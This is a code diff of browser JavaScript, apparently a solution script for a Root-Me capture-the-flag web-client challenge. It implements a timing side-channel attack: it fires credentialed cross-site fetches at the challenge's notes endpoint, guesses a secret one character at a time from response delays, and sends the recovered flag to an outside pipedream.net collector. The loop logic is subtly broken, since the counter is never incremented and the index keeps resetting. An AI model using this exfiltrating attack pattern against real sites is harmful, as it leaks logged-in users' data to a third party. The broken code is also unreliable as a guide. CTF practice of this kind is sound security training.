@@ -26,34 +26,33 @@
         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
 
         for (let i = 0; i < 50; i++) {
-            setTimeout(() => {
-                let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
-                let flag = "z"
-                let cnt = 0
-                // Start the clock
-                var start = performance.now()
-                // Measure how long it takes to complete the fetch requests
-                fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${9372}/${flag}${alpha[i]}`, {
-                    mode: 'no-cors',
-                    credentials: 'include'
-                }).then(() => {
-                    // When fetch finishes, calculate the difference
-                    var time = performance.now() - start;
-                    console.log("The request took %d ms.", time);
-                    if (time >= 2000) {
-                        //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
-                        flag = flag + alpha[i];
-                        if (cnt > 5)
-                            fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
-                    }
-                });
-                if (i < 49) {
-                    i = 0;
-                    if (cnt > 9) {
-                        i = 50
-                    }
+            let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
+            let flag = "z"
+            let cnt = 0
+            // Start the clock
+            var start = performance.now()
+            // Measure how long it takes to complete the fetch requests
+            fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${392}/${flag}${alpha[i]}`, {
+                mode: 'no-cors',
+                credentials: 'include'
+            }).then(() => {
+                // When fetch finishes, calculate the difference
+                var time = performance.now() - start;
+                console.log("The request took %d ms.", time);
+                if (time >= 2000) {
+                    //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
+                    flag = flag + alpha[i];
+                    if (cnt > 5)
+                        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
                 }
-            }, 500)
+            });
+            if (i < 49) {
+                i = 0;
+                if (cnt > 9) {
+                    i = 50
+                }
+            }
+
         }
 
 
